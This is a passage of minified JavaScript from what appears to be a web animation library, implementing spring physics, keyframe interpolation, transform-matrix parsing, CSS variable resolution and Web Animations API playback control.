n=[],r={color:0,var:0,number:0};for(let i=0;i<e.values.length;i++){const s=e.types[i],o=t.indexes[s][r[s]],a=t.values[o]??0;n[i]=a,r[s]++}return n}const iP=(t,e)=>{const n=Or.createTransformer(e),r=ra(t),i=ra(e);return r.indexes.var.length===i.indexes.var.length&&r.indexes.color.length===i.indexes.color.length&&r.indexes.number.length>=i.indexes.number.length?kh.has(t)&&!i.values.length||kh.has(e)&&!r.values.length?eP(t,e):Aa(fk(rP(r,i),i.values),n):wu(t,e)};function hk(t,e,n){return typeof t=="number"&&typeof e=="number"&&typeof n=="number"?ce(t,e,n):Fm(t)(t,e)}const sP=t=>{const e=({timestamp:n})=>t(n);return{start:(n=!0)=>oe.update(e,n),stop:()=>Rr(e),now:()=>He.isProcessing?He.timestamp:gt.now()}},pk=(t,e,n=10)=>{let r="";const i=Math.max(Math.round(e/n),2);for(let s=0;s<i;s++)r+=Math.round(t(s/(i-1))*1e4)/1e4+", ";return`linear(${r.substring(0,r.length-2)})`},Su=2e4;function Bm(t){let e=0;const n=50;let r=t.next(e);for(;!r.done&&e<Su;)e+=n,r=t.next(e);return e>=Su?1/0:e}function oP(t,e=100,n){const r=n({...t,keyframes:[0,e]}),i=Math.min(Bm(r),Su);return{type:"keyframes",ease:s=>r.next(i*s).value/e,duration:wn(i)}}const aP=5;function mk(t,e,n){const r=Math.max(e-aP,0);return GS(n-t(r),e-r)}const ye={stiffness:100,damping:10,mass:1,velocity:0,duration:800,bounce:.3,visualDuration:.3,restSpeed:{granular:.01,default:2},restDelta:{granular:.005,default:.5},minDuration:.01,maxDuration:10,minDamping:.05,maxDamping:1},Bd=.001;function lP({duration:t=ye.duration,bounce:e=ye.bounce,velocity:n=ye.velocity,mass:r=ye.mass}){let i,s,o=1-e;o=Kn(ye.minDamping,ye.maxDamping,o),t=Kn(ye.minDuration,ye.maxDuration,wn(t)),o<1?(i=u=>{const c=u*o,d=c*t,f=c-n,h=bh(u,o),p=Math.exp(-d);return Bd-f/h*p},s=u=>{const d=u*o*t,f=d*n+n,h=Math.pow(o,2)*Math.pow(u,2)*t,p=Math.exp(-d),y=bh(Math.pow(u,2),o);return(-i(u)+Bd>0?-1:1)*((f-h)*p)/y}):(i=u=>{const c=Math.exp(-u*t),d=(u-n)*t+1;return-Bd+c*d},s=u=>{const c=Math.exp(-u*t),d=(n-u)*(t*t);return c*d});const a=5/t,l=cP(i,s,a);if(t=vn(t),isNaN(l))return{stiffness:ye.stiffness,damping:ye.damping,duration:t};{const u=Math.pow(l,2)*r;return{stiffness:u,damping:o*2*Math.sqrt(r*u),duration:t}}}const uP=12;function cP(t,e,n){let r=n;for(let i=1;i<uP;i++)r=r-t(r)/e(r);return r}function bh(t,e){return t*Math.sqrt(1-e*e)}const dP=["duration","bounce"],fP=["stiffness","damping","mass"];function v0(t,e){return e.some(n=>t[n]!==void 0)}function hP(t){let e={velocity:ye.velocity,stiffness:ye.stiffness,damping:ye.damping,mass:ye.mass,isResolvedFromDuration:!1,...t};if(!v0(t,fP)&&v0(t,dP))if(t.visualDuration){const n=t.visualDuration,r=2*Math.PI/(n*1.2),i=r*r,s=2*Kn(.05,1,1-(t.bounce||0))*Math.sqrt(i);e={...e,mass:ye.mass,stiffness:i,damping:s}}else{const n=lP(t);e={...e,...n,mass:ye.mass},e.isResolvedFromDuration=!0}return e}function ku(t=ye.visualDuration,e=ye.bounce){const n=typeof t!="object"?{visualDuration:t,keyframes:[0,1],bounce:e}:t;let{restSpeed:r,restDelta:i}=n;const s=n.keyframes[0],o=n.keyframes[n.keyframes.length-1],a={done:!1,value:s},{stiffness:l,damping:u,mass:c,duration:d,velocity:f,isResolvedFromDuration:h}=hP({...n,velocity:-wn(n.velocity||0)}),p=f||0,y=u/(2*Math.sqrt(l*c)),x=o-s,g=wn(Math.sqrt(l/c)),v=Math.abs(x)<5;r||(r=v?ye.restSpeed.granular:ye.restSpeed.default),i||(i=v?ye.restDelta.granular:ye.restDelta.default);let w;if(y<1){const k=bh(g,y);w=E=>{const M=Math.exp(-y*g*E);return o-M*((p+y*g*x)/k*Math.sin(k*E)+x*Math.cos(k*E))}}else if(y===1)w=k=>o-Math.exp(-g*k)*(x+(p+g*x)*k);else{const k=g*Math.sqrt(y*y-1);w=E=>{const M=Math.exp(-y*g*E),C=Math.min(k*E,300);return o-M*((p+y*g*x)*Math.sinh(C)+k*x*Math.cosh(C))/k}}const b={calculatedDuration:h&&d||null,next:k=>{const E=w(k);if(h)a.done=k>=d;else{let M=k===0?p:0;y<1&&(M=k===0?vn(p):mk(w,k,E));const C=Math.abs(M)<=r,N=Math.abs(o-E)<=i;a.done=C&&N}return a.value=a.done?o:E,a},toString:()=>{const k=Math.min(Bm(b),Su),E=pk(M=>b.next(k*M).value,k,30);return k+"ms "+E},toTransition:()=>{}};return b}ku.applyToOptions=t=>{const e=oP(t,100,ku);return t.ease=e.ease,t.duration=vn(e.duration),t.type="keyframes",t};function Ch({keyframes:t,velocity:e=0,power:n=.8,timeConstant:r=325,bounceDamping:i=10,bounceStiffness:s=500,modifyTarget:o,min:a,max:l,restDelta:u=.5,restSpeed:c}){const d=t[0],f={done:!1,value:d},h=C=>a!==void 0&&C<a||l!==void 0&&C>l,p=C=>a===void 0?l:l===void 0||Math.abs(a-C)<Math.abs(l-C)?a:l;let y=n*e;const x=d+y,g=o===void 0?x:o(x);g!==x&&(y=g-d);const v=C=>-y*Math.exp(-C/r),w=C=>g+v(C),b=C=>{const N=v(C),O=w(C);f.done=Math.abs(N)<=u,f.value=f.done?g:O};let k,E;const M=C=>{h(f.value)&&(k=C,E=ku({keyframes:[f.value,p(f.value)],velocity:mk(w,C,f.value),damping:i,stiffness:s,restDelta:u,restSpeed:c}))};return M(0),{calculatedDuration:null,next:C=>{let N=!1;return!E&&k===void 0&&(N=!0,b(C),M(C)),k!==void 0&&C>=k?E.next(C-k):(!N&&b(C),f)}}}function pP(t,e,n){const r=[],i=n||qn.mix||hk,s=t.length-1;for(let o=0;o<s;o++){let a=i(t[o],t[o+1]);if(e){const l=Array.isArray(e)?e[o]||Ut:e;a=Aa(l,a)}r.push(a)}return r}function mP(t,e,{clamp:n=!0,ease:r,mixer:i}={}){const s=t.length;if(vu(s===e.length),s===1)return()=>e[0];if(s===2&&e[0]===e[1])return()=>e[1];const o=t[0]===t[1];t[0]>t[s-1]&&(t=[...t].reverse(),e=[...e].reverse());const a=pP(e,r,i),l=a.length,u=c=>{if(o&&c<t[0])return e[0];let d=0;if(l>1)for(;d<t.length-2&&!(c<t[d+1]);d++);const f=ta(t[d],t[d+1],c);return a[d](f)};return n?c=>u(Kn(t[0],t[s-1],c)):u}function gP(t,e){const n=t[t.length-1];for(let r=1;r<=e;r++){const i=ta(0,e,r);t.push(ce(n,1,i))}}function yP(t){const e=[0];return gP(e,t.length-1),e}function xP(t,e){return t.map(n=>n*e)}function vP(t,e){return t.map(()=>e||rk).splice(0,t.length-1)}function bo({duration:t=300,keyframes:e,times:n,ease:r="easeInOut"}){const i=RA(r)?r.map(h0):h0(r),s={done:!1,value:e[0]},o=xP(n&&n.length===e.length?n:yP(e),t),a=mP(o,e,{ease:Array.isArray(i)?i:vP(e,i)});return{calculatedDuration:t,next:l=>(s.value=a(l),s.done=l>=t,s)}}const wP=t=>t!==null;function Vm(t,{repeat:e,repeatType:n="loop"},r,i=1){const s=t.filter(wP),a=i<0||e&&n!=="loop"&&e%2===1?0:s.length-1;return!a||r===void 0?s[a]:r}const SP={decay:Ch,inertia:Ch,tween:bo,keyframes:bo,spring:ku};function gk(t){typeof t.type=="string"&&(t.type=SP[t.type])}class zm{constructor(){this.updateFinished()}get finished(){return this._finished}updateFinished(){this._finished=new Promise(e=>{this.resolve=e})}notifyFinished(){this.resolve()}then(e,n){return this.finished.then(e,n)}}const kP=t=>t/100;class _m extends zm{constructor(e){super(),this.state="idle",this.startTime=null,this.isStopped=!1,this.currentTime=0,this.holdTime=null,this.playbackSpeed=1,this.stop=()=>{var r,i;const{motionValue:n}=this.options;n&&n.updatedAt!==gt.now()&&this.tick(gt.now()),this.isStopped=!0,this.state!=="idle"&&(this.teardown(),(i=(r=this.options).onStop)==null||i.call(r))},this.options=e,this.initAnimation(),this.play(),e.autoplay===!1&&this.pause()}initAnimation(){const{options:e}=this;gk(e);const{type:n=bo,repeat:r=0,repeatDelay:i=0,repeatType:s,velocity:o=0}=e;let{keyframes:a}=e;const l=n||bo;l!==bo&&typeof a[0]!="number"&&(this.mixKeyframes=Aa(kP,hk(a[0],a[1])),a=[0,100]);const u=l({...e,keyframes:a});s==="mirror"&&(this.mirroredGenerator=l({...e,keyframes:[...a].reverse(),velocity:-o})),u.calculatedDuration===null&&(u.calculatedDuration=Bm(u));const{calculatedDuration:c}=u;this.calculatedDuration=c,this.resolvedDuration=c+i,this.totalDuration=this.resolvedDuration*(r+1)-i,this.generator=u}updateTime(e){const n=Math.round(e-this.startTime)*this.playbackSpeed;this.holdTime!==null?this.currentTime=this.holdTime:this.currentTime=n}tick(e,n=!1){const{generator:r,totalDuration:i,mixKeyframes:s,mirroredGenerator:o,resolvedDuration:a,calculatedDuration:l}=this;if(this.startTime===null)return r.next(0);const{delay:u=0,keyframes:c,repeat:d,repeatType:f,repeatDelay:h,type:p,onUpdate:y,finalKeyframe:x}=this.options;this.speed>0?this.startTime=Math.min(this.startTime,e):this.speed<0&&(this.startTime=Math.min(e-i/this.speed,this.startTime)),n?this.currentTime=e:this.updateTime(e);const g=this.currentTime-u*(this.playbackSpeed>=0?1:-1),v=this.playbackSpeed>=0?g<0:g>i;this.currentTime=Math.max(g,0),this.state==="finished"&&this.holdTime===null&&(this.currentTime=i);let w=this.currentTime,b=r;if(d){const C=Math.min(this.currentTime,i)/a;let N=Math.floor(C),O=C%1;!O&&C>=1&&(O=1),O===1&&N--,N=Math.min(N,d+1),!!(N%2)&&(f==="reverse"?(O=1-O,h&&(O-=h/a)):f==="mirror"&&(b=o)),w=Kn(0,1,O)*a}const k=v?{done:!1,value:c[0]}:b.next(w);s&&(k.value=s(k.value));let{done:E}=k;!v&&l!==null&&(E=this.playbackSpeed>=0?this.currentTime>=i:this.currentTime<=0);const M=this.holdTime===null&&(this.state==="finished"||this.state==="running"&&E);return M&&p!==Ch&&(k.value=Vm(c,this.options,x,this.speed)),y&&y(k.value),M&&this.finish(),k}then(e,n){return this.finished.then(e,n)}get duration(){return wn(this.calculatedDuration)}get time(){return wn(this.currentTime)}set time(e){var n;e=vn(e),this.currentTime=e,this.startTime===null||this.holdTime!==null||this.playbackSpeed===0?this.holdTime=e:this.driver&&(this.startTime=this.driver.now()-e/this.playbackSpeed),(n=this.driver)==null||n.start(!1)}get speed(){return this.playbackSpeed}set speed(e){this.updateTime(gt.now());const n=this.playbackSpeed!==e;this.playbackSpeed=e,n&&(this.time=wn(this.currentTime))}play(){var i,s;if(this.isStopped)return;const{driver:e=sP,startTime:n}=this.options;this.driver||(this.driver=e(o=>this.tick(o))),(s=(i=this.options).onPlay)==null||s.call(i);const r=this.driver.now();this.state==="finished"?(this.updateFinished(),this.startTime=r):this.holdTime!==null?this.startTime=r-this.holdTime:this.startTime||(this.startTime=n??r),this.state==="finished"&&this.speed<0&&(this.startTime+=this.calculatedDuration),this.holdTime=null,this.state="running",this.driver.start()}pause(){this.state="paused",this.updateTime(gt.now()),this.holdTime=this.currentTime}complete(){this.state!=="running"&&this.play(),this.state="finished",this.holdTime=null}finish(){var e,n;this.notifyFinished(),this.teardown(),this.state="finished",(n=(e=this.options).onComplete)==null||n.call(e)}cancel(){var e,n;this.holdTime=null,this.startTime=0,this.tick(0),this.teardown(),(n=(e=this.options).onCancel)==null||n.call(e)}teardown(){this.state="idle",this.stopDriver(),this.startTime=this.holdTime=null}stopDriver(){this.driver&&(this.driver.stop(),this.driver=void 0)}sample(e){return this.startTime=0,this.tick(e,!0)}attachTimeline(e){var n;return this.options.allowFlatten&&(this.options.type="keyframes",this.options.ease="linear",this.initAnimation()),(n=this.driver)==null||n.stop(),e.observe(this)}}function bP(t){for(let e=1;e<t.length;e++)t[e]??(t[e]=t[e-1])}const Xr=t=>t*180/Math.PI,Eh=t=>{const e=Xr(Math.atan2(t[1],t[0]));return Th(e)},CP={x:4,y:5,translateX:4,translateY:5,scaleX:0,scaleY:3,scale:t=>(Math.abs(t[0])+Math.abs(t[3]))/2,rotate:Eh,rotateZ:Eh,skewX:t=>Xr(Math.atan(t[1])),skewY:t=>Xr(Math.atan(t[2])),skew:t=>(Math.abs(t[1])+Math.abs(t[2]))/2},Th=t=>(t=t%360,t<0&&(t+=360),t),w0=Eh,S0=t=>Math.sqrt(t[0]*t[0]+t[1]*t[1]),k0=t=>Math.sqrt(t[4]*t[4]+t[5]*t[5]),EP={x:12,y:13,z:14,translateX:12,translateY:13,translateZ:14,scaleX:S0,scaleY:k0,scale:t=>(S0(t)+k0(t))/2,rotateX:t=>Th(Xr(Math.atan2(t[6],t[5]))),rotateY:t=>Th(Xr(Math.atan2(-t[2],t[0]))),rotateZ:w0,rotate:w0,skewX:t=>Xr(Math.atan(t[4])),skewY:t=>Xr(Math.atan(t[1])),skew:t=>(Math.abs(t[1])+Math.abs(t[4]))/2};function Mh(t){return t.includes("scale")?1:0}function Nh(t,e){if(!t||t==="none")return Mh(e);const n=t.match(/^matrix3d\(([-\d.e\s,]+)\)$/u);let r,i;if(n)r=EP,i=n;else{const a=t.match(/^matrix\(([-\d.e\s,]+)\)$/u);r=CP,i=a}if(!i)return Mh(e);const s=r[e],o=i[1].split(",").map(MP);return typeof s=="function"?s(o):o[s]}const TP=(t,e)=>{const{transform:n="none"}=getComputedStyle(t);return Nh(n,e)};function MP(t){return parseFloat(t.trim())}const Fs=["transformPerspective","x","y","z","translateX","translateY","translateZ","scale","scaleX","scaleY","rotate","rotateX","rotateY","rotateZ","skew","skewX","skewY"],Bs=new Set(Fs),b0=t=>t===js||t===_,NP=new Set(["x","y","z"]),AP=Fs.filter(t=>!NP.has(t));function PP(t){const e=[];return AP.forEach(n=>{const r=t.getValue(n);r!==void 0&&(e.push([n,r.get()]),r.set(n.startsWith("scale")?1:0))}),e}const oi={width:({x:t},{paddingLeft:e="0",paddingRight:n="0"})=>t.max-t.min-parseFloat(e)-parseFloat(n),height:({y:t},{paddingTop:e="0",paddingBottom:n="0"})=>t.max-t.min-parseFloat(e)-parseFloat(n),top:(t,{top:e})=>parseFloat(e),left:(t,{left:e})=>parseFloat(e),bottom:({y:t},{top:e})=>parseFloat(e)+(t.max-t.min),right:({x:t},{left:e})=>parseFloat(e)+(t.max-t.min),x:(t,{transform:e})=>Nh(e,"x"),y:(t,{transform:e})=>Nh(e,"y")};oi.translateX=oi.x;oi.translateY=oi.y;const ai=new Set;let Ah=!1,Ph=!1,Rh=!1;function yk(){if(Ph){const t=Array.from(ai).filter(r=>r.needsMeasurement),e=new Set(t.map(r=>r.element)),n=new Map;e.forEach(r=>{const i=PP(r);i.length&&(n.set(r,i),r.render())}),t.forEach(r=>r.measureInitialState()),e.forEach(r=>{r.render();const i=n.get(r);i&&i.forEach(([s,o])=>{var a;(a=r.getValue(s))==null||a.set(o)})}),t.forEach(r=>r.measureEndState()),t.forEach(r=>{r.suspendedScrollY!==void 0&&window.scrollTo(0,r.suspendedScrollY)})}Ph=!1,Ah=!1,ai.forEach(t=>t.complete(Rh)),ai.clear()}function xk(){ai.forEach(t=>{t.readKeyframes(),t.needsMeasurement&&(Ph=!0)})}function RP(){Rh=!0,xk(),yk(),Rh=!1}class $m{constructor(e,n,r,i,s,o=!1){this.state="pending",this.isAsync=!1,this.needsMeasurement=!1,this.unresolvedKeyframes=[...e],this.onComplete=n,this.name=r,this.motionValue=i,this.element=s,this.isAsync=o}scheduleResolve(){this.state="scheduled",this.isAsync?(ai.add(this),Ah||(Ah=!0,oe.read(xk),oe.resolveKeyframes(yk))):(this.readKeyframes(),this.complete())}readKeyframes(){const{unresolvedKeyframes:e,name:n,element:r,motionValue:i}=this;if(e[0]===null){const s=i==null?void 0:i.get(),o=e[e.length-1];if(s!==void 0)e[0]=s;else if(r&&n){const a=r.readValue(n,o);a!=null&&(e[0]=a)}e[0]===void 0&&(e[0]=o),i&&s===void 0&&i.set(e[0])}bP(e)}setFinalKeyframe(){}measureInitialState(){}renderEndStyles(){}measureEndState(){}complete(e=!1){this.state="complete",this.onComplete(this.unresolvedKeyframes,this.finalKeyframe,e),ai.delete(this)}cancel(){this.state==="scheduled"&&(ai.delete(this),this.state="pending")}resume(){this.state==="pending"&&this.scheduleResolve()}}const OP=t=>t.startsWith("--");function DP(t,e,n){OP(e)?t.style.setProperty(e,n):t.style[e]=n}const LP=Am(()=>window.ScrollTimeline!==void 0),IP={};function jP(t,e){const n=Am(t);return()=>IP[e]??n()}const vk=jP(()=>{try{document.createElement("div").animate({opacity:0},{easing:"linear(0, 1)"})}catch{return!1}return!0},"linearEasing"),ao=([t,e,n,r])=>`cubic-bezier(${t}, ${e}, ${n}, ${r})`,C0={linear:"linear",ease:"ease",easeIn:"ease-in",easeOut:"ease-out",easeInOut:"ease-in-out",circIn:ao([0,.65,.55,1]),circOut:ao([.55,0,1,.45]),backIn:ao([.31,.01,.66,-.59]),backOut:ao([.33,1.53,.69,.99])};function wk(t,e){if(t)return typeof t=="function"?vk()?pk(t,e):"ease-out":ik(t)?ao(t):Array.isArray(t)?t.map(n=>wk(n,e)||C0.easeOut):C0[t]}function FP(t,e,n,{delay:r=0,duration:i=300,repeat:s=0,repeatType:o="loop",ease:a="easeOut",times:l}={},u=void 0){const c={[e]:n};l&&(c.offset=l);const d=wk(a,i);Array.isArray(d)&&(c.easing=d);const f={delay:r,duration:i,easing:Array.isArray(d)?"linear":d,fill:"both",iterations:s+1,direction:o==="reverse"?"alternate":"normal"};return u&&(f.pseudoElement=u),t.animate(c,f)}function Sk(t){return typeof t=="function"&&"applyToOptions"in t}function BP({type:t,...e}){return Sk(t)&&vk()?t.applyToOptions(e):(e.duration??(e.duration=300),e.ease??(e.ease="easeOut"),e)}class VP extends zm{constructor(e){if(super(),this.finishedTime=null,this.isStopped=!1,!e)return;const{element:n,name:r,keyframes:i,pseudoElement:s,allowFlatten:o=!1,finalKeyframe:a,onComplete:l}=e;this.isPseudoElement=!!s,this.allowFlatten=o,this.options=e,vu(typeof e.type!="string");const u=BP(e);this.animation=FP(n,r,i,u,s),u.autoplay===!1&&this.animation.pause(),this.animation.onfinish=()=>{if(this.finishedTime=this.time,!s){const c=Vm(i,this.options,a,this.speed);this.updateMotionValue?this.updateMotionValue(c):DP(n,r,c),this.animation.cancel()}l==null||l(),this.notifyFinished()}}play(){this.isStopped||(this.animation.play(),this.state==="finished"&&this.updateFinished())}pause(){this.animation.pause()}complete(){var e,n;(n=(e=this.animation).finish)==null||n.call(e)}cancel(){try{this.animation.cancel()}catch{}}stop(){if(this.isStopped)return;this.isStopped=!0;const{state:e}=this;e==="idle"||e==="finished"||(this.updateMotionValue?this.updateMotionValue():this.commitStyles(),this.isPseudoElement||this.cancel())}commitStyles(){var e,n;this.isPseudoElement||(n=(e=this.animation).commitStyles)==null||n.call(e)}get duration(){var n,r;const e=((r=(n=this.animation.effect)==null?void 0:n.getComputedTiming)==null?void 0:r.call(n).duration)||0;return wn(Number(e))}get time(){return wn(Number(this.animation.currentTime)||0)}set time(e){this.finishedTime=null,this.animation.currentTime=vn(e)}get speed(){return this.animation.playbackRate}set speed(e){e<0&&(this.finishedTime=null),this.animation.playbackRate=e}get state(){return this.finishedTime!==null?"finished":this.animation.playState}get startTime(){return Number(this.animation.startTime)}set startTime(e){this.animation.startTime=e}attachTimeline({timeline:e,observe:n}){var r;return this.allowFlatten&&((r=this.animation.effect)==null||r.updateTiming({easing:"linear"})),this.animation.onfinish=null,e&&LP()?(this.animation.timeline=e,Ut):n(this)}}const kk={anticipate:ek,backInOut:ZS,circInOut:nk};function zP(t){return t in kk}function _P(t){typeof t.ease=="string"&&zP(t.ease)&&(t.ease=kk[t.ease])}const E0=10;class $P extends VP{constructor(e){_P(e),gk(e),super(e),e.startTime&&(this.startTime=e.startTime),this.options=e}updateMotionValue(e){const{motionValue:n,onUpdate:r,onComplete:i,element:s,...o}=this.options;if(!n)return;if(e!==void 0){n.set(e);return}const a=new _m({...o,autoplay:!1}),l=vn(this.finishedTime??this.time);n.setWithVelocity(a.sample(l-E0).value,a.sample(l).value,E0),a.stop()}}const T0=(t,e)=>e==="zIndex"?!1:!!(typeof t=="number"||Array.isArray(t)||typeof t=="string"&&(Or.test(t)||t==="0")&&!t.startsWith("url("));function HP(t){const e=t[0];if(t.length===1)return!0;for(let n=0;n<t.length;n++)if(t[n]!==e)return!0}function UP(t,e,n,r){const i=t[0];if(i===null)return!1;if(e==="display"||e==="visibility")return!0;const s=t[t.length-1],o=T0(i,e),a=T0(s,e);return!o||!a?!1:HP(t)||(n==="spring"||Sk(n))&&r}function Oh(t){t.duration=0,t.type}const WP=new Set(["opacity","clipPath","filter","transform"]),KP=Am(()=>Object.hasOwnProperty.call(Element.prototype,"animate"));function qP(t){var c;const{motionValue:e,name:n,repeatDelay:r,repeatType:i,damping:s,type:o}=t;if(!(((c=e==null?void 0:e.owner)==null?void 0:c.current)instanceof HTMLElement))return!1;const{onUpdate:l,transformTemplate:u}=e.owner.getProps();return KP()&&n&&WP.has(n)&&(n!=="transform"||!u)&&!l&&!r&&i!=="mirror"&&s!==0&&o!=="inertia"}const GP=40;class JP extends zm{constructor({autoplay:e=!0,delay:n=0,type:r="keyframes",repeat:i=0,repeatDelay:s=0,repeatType:o="loop",keyframes:a,name:l,motionValue:u,element:c,...d}){var p;super(),this.stop=()=>{var y,x;this._animation&&(this._animation.stop(),(y=this.stopTimeline)==null||y.call(this)),(x=this.keyframeResolver)==null||x.cancel()},this.createdAt=gt.now();const f={autoplay:e,delay:n,type:r,repeat:i,repeatDelay:s,repeatType:o,name:l,motionValue:u,element:c,...d},h=(c==null?void 0:c.KeyframeResolver)||$m;this.keyframeResolver=new h(a,(y,x,g)=>this.onKeyframesResolved(y,x,f,!g),l,u,c),(p=this.keyframeResolver)==null||p.scheduleResolve()}onKeyframesResolved(e,n,r,i){this.keyframeResolver=void 0;const{name:s,type:o,velocity:a,delay:l,isHandoff:u,onUpdate:c}=r;this.resolvedAt=gt.now(),UP(e,s,o,a)||((qn.instantAnimations||!l)&&(c==null||c(Vm(e,r,n))),e[0]=e[e.length-1],Oh(r),r.repeat=0);const f={startTime:i?this.resolvedAt?this.resolvedAt-this.createdAt>GP?this.resolvedAt:this.createdAt:this.createdAt:void 0,finalKeyframe:n,...r,keyframes:e},h=!u&&qP(f)?new $P({...f,element:f.motionValue.owner.current}):new _m(f);h.finished.then(()=>this.notifyFinished()).catch(Ut),this.pendingTimeline&&(this.stopTimeline=h.attachTimeline(this.pendingTimeline),this.pendingTimeline=void 0),this._animation=h}get finished(){return this._animation?this.animation.finished:this._finished}then(e,n){return this.finished.finally(e).then(()=>{})}get animation(){var e;return this._animation||((e=this.keyframeResolver)==null||e.resume(),RP()),this._animation}get duration(){return this.animation.duration}get time(){return this.animation.time}set time(e){this.animation.time=e}get speed(){return this.animation.speed}get state(){return this.animation.state}set speed(e){this.animation.speed=e}get startTime(){return this.animation.startTime}attachTimeline(e){return this._animation?this.stopTimeline=this.animation.attachTimeline(e):this.pendingTimeline=e,()=>this.stop()}play(){this.animation.play()}pause(){this.animation.pause()}complete(){this.animation.complete()}cancel(){var e;this._animation&&this.animation.cancel(),(e=this.keyframeResolver)==null||e.cancel()}}const YP=/^var\(--(?:([\w-]+)|([\w-]+), ?([a-zA-Z\d ()%#.,-]+))\)/u;function QP(t){const e=YP.exec(t);if(!e)return[,];const[,n,r,i]=e;return[`--${n??r}`,i]}function bk(t,e,n=1){const[r,i]=QP(t);if(!r)return;const s=window.getComputedStyle(e).getPropertyValue(r);if(s){const o=s.trim();return WS(o)?parseFloat(o):o}return Lm(i)?bk(i,e,n+1):i}function Hm(t,e){return(t==null?void 0:t[e])??(t==null?void 0:t.default)??t}const Ck=new Set(["width","height","top","left","right","bottom",...Fs]),XP={test:t=>t==="auto",parse:t=>t},Ek=t=>e=>e.test(t),Tk=[js,_,Sn,er,HA,$A,XP],M0=t=>Tk.find(Ek(t));function ZP(t){return typeof t=="number"?t===0:t!==null?t==="none"||t==="0"||qS(t):!0}const eR=new Set(["brightness","contrast","saturate","opacity"]);function tR(t){const[e,n]=t.slice(0,-1).split("(");if(e==="drop-shadow")return t;const[r]=n.match(Im)||[];if(!r)return t;const i=n.replace(r,"");let s=eR.has(e)?1:0;return r!==n&&(s*=100),e+"("+s+i+")"}const nR=/\b([a-z-]*)\(.*?\)/gu,Dh={...Or,getAnimatableNone:t=>{const e=t.match(nR);return e?e.map(tR).join(" "):t}},N0={...js,transform:Math.round},rR={rotate:er,rotateX:er,rotateY:er,rotateZ:er,scale:ll,scaleX:ll,scaleY:ll,scaleZ:ll,skew:er,skewX:er,skewY:er,distance:_,translateX:_,translateY:_,translateZ:_,x:_,y:_,z:_,perspective:_,transformPerspective:_,opacity:na,originX:m0,originY:m0,originZ:_},Um={borderWidth:_,borderTopWidth:_,borderRightWidth:_,borderBottomWidth:_,borderLeftWidth:_,borderRadius:_,radius:_,borderTopLeftRadius:_,borderTopRightRadius:_,borderBottomRightRadius:_,borderBottomLeftRadius:_,width:_,maxWidth:_,height:_,maxHeight:_,top:_,right:_,bottom:_,left:_,padding:_,paddingTop:_,paddingRight:_,paddingBottom:_,paddingLeft:_,margin:_,marginTop:_,marginRight:_,marginBottom:_,marginLeft:_,backgroundPositionX:_,backgroundPositionY:_,...rR,zIndex:N0,fillOpacity:na,strokeOpacity:na,numOctaves:N0},iR={...Um,color:Ce,backgroundColor:Ce,outlineColor:Ce,fill:Ce,stroke:Ce,borderColor:Ce,borderTopColor:Ce,borderRightColor:Ce,borderBottomColor:Ce,borderLeftColor:Ce,filter:Dh,WebkitFilter:Dh},Mk=t=>iR[t];function Nk(t,e){let n=Mk(t);return n!==Dh&&(n=Or),n.getAnimatableNone?n.getAnimatableNone(e):void 0}const sR=new Set(["auto","none","0"]);function oR(t,e,n){let r=0,i;for(;r<t.length&&!i;){const s=t[r];typeof s=="string"&&!sR.has(s)&&ra(s).values.length&&(i=t[r]),r++}if(i&&n)for(const s of e)t[s]=Nk(n,i)}class aR extends $m{constructor(e,n,r,i,s){super(e,n,r,i,s,!0)}readKeyframes(){const{unresolvedKeyframes:e,element:n,name:r}=this;if(!n||!n.current)return;super.readKeyframes();for(let l=0;l<e.length;l++){let u=e[l];if(typeof u=="string"&&(u=u.trim(),Lm(u))){const c=bk(u,n.current);c!==void 0&&(e[l]=c),l===e.length-1&&(this.finalKeyframe=u)}}if(this.resolveNoneKeyframes(),!Ck.has(r)||e.length!==2)return;const[i,s]=e,o=M0(i),a=M0(s);if(o!==a)if(b0(o)&&b0(a))for(let l=0;l<e.length;l++){const u=e[l];typeof u=="string"&&(e[l]=parseFloat(u))}else oi[r]&&(this.needsMeasurement=!0)}resolveNoneKeyframes(){const{unresolvedKeyframes:e,name:n}=this,r=[];for(let i=0;i<e.length;i++)(e[i]===null||ZP(e[i]))&&r.push(i);r.length&&oR(e,r,n)}measureInitialState(){const{element:e,unresolvedKeyframes:n,name:r}=this;if(!e||!e.current)return;r==="height"&&(this.suspendedScrollY=window.pageYOffset),this.measuredOrigin=oi[r](e.measureViewportBox(),window.getComputedStyle(e.current)),n[0]=this.measuredOrigin;const i=n[n.length-1];i!==void 0&&e.getValue(r,i).jump(i,!1)}measureEndState(){var a;const{element:e,name:n,unresolvedKeyframes:r}=this;if(!e||!e.current)return;const i=e.getValue(n);i&&i.jump(this.measuredOrigin,!1);const s=r.length-1,o=r[s];r[s]=oi[n](e.measureViewportBox(),window.getComputedStyle(e.current)),o!==null&&this.finalKeyframe===void 0&&(this.finalKeyframe=o),(a=this.removedTransforms)!=null&&a.length&&this.removedTransforms.forEach(([l,u])=>{e.getValue(l).set(u)}),this.resolveNoneKeyframes()}}function lR(t,e,n){if(t instanceof EventTarget)return[t];if(typeof t=="string"){const i=document.querySelectorAll(t);return i?Array.from(i):[]}return Array.from(t)}const Ak=(t,e)=>e&&typeof t=="number"?e.transform(t):t;function Pk(t){return KS(t)&&"offsetHeight"in t}const A0=30,uR=t=>!isNaN(parseFloat(t));class cR{constructor(e,n={}){this.canTrackVelocity=null,this.events={},this.updateAndNotify=r=>{var s;const i=gt.now();if(this.updatedAt!==i&&this.setPrevFrameValue(),this.prev=this.current,this.setCurrent(r),this.current!==this.prev&&((s=this.events.change)==null||s.notify(this.current),this.dependents))for(const o of this.dependents)o.dirty()},this.hasAnimated=!1,this.setCurrent(e),this.owner=n.owner}setCurrent(e){this.current=e,this.updatedAt=gt.now(),this.canTrackVelocity===null&&e!==void 0&&(this.canTrackVelocity=uR(this.current))}setPrevFrameValue(e=this.current){this.prevFrameValue=e,this.prevUpdatedAt=this.updatedAt}onChange(e){return this.on("change",e)}on(e,n){this.events[e]||(this.events[e]=new Pm);const r=this.events[e].add(n);return e==="change"?()=>{r(),oe.read(()=>{this.events.change.getSize()||this.stop()})}:r}clearListeners(){for(const e in this.events)this.events[e].clear()}attach(e,n){this.passiveEffect=e,this.stopPassiveEffect=n}set(e){this.passiveEffect?this.passiveEffect(e,this.updateAndNotify):this.updateAndNotify(e)}setWithVelocity(e,n,r){this.set(n),this.prev=void 0,this.prevFrameValue=e,this.prevUpdatedAt=this.updatedAt-r}jump(e,n=!0){this.updateAndNotify(e),this.prev=e,this.prevUpdatedAt=this.prevFrameValue=void 0,n&&this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}dirty(){var 